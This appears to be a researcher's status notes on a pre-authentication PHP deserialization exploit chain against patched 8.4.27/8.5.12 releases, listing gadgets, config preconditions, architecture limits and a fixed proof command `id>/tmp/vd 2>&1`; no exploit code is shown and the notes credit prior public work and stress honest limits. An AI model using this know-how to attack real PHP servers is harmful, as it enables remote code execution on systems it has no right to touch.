- **G0/G1/G2 pass**; G4 is a novelty retraction plus a local-only decision;
  G3 (breadth fallback) was not run.
- **The composition is public** (ACD421 `fa_jammy.sh` 2026-10-26; `zero1`
  2026-10-21). Credit it explicitly and never claim novelty for it.
- **The defensible delta** is patched 8.4.27/8.5.12 pre-auth end-to-end,
  `cleanup=On` race + `var_destroy` terminal, arm64 no-`/proc`, measured
  carrier/constants, and the two config/plugin-gated app profiles.
- **The honest ceiling** is a re-entry `__destruct` gadget plus a non-default
  `php_serialize` config; native x86-64 still needs a leak; the direct runs
  use `/proc`; the arm64 brute force is noisy.
- **The command is fixed**: `id>/tmp/vd 2>&1`. There is no command interface,
  and none should be added to any derivative text.
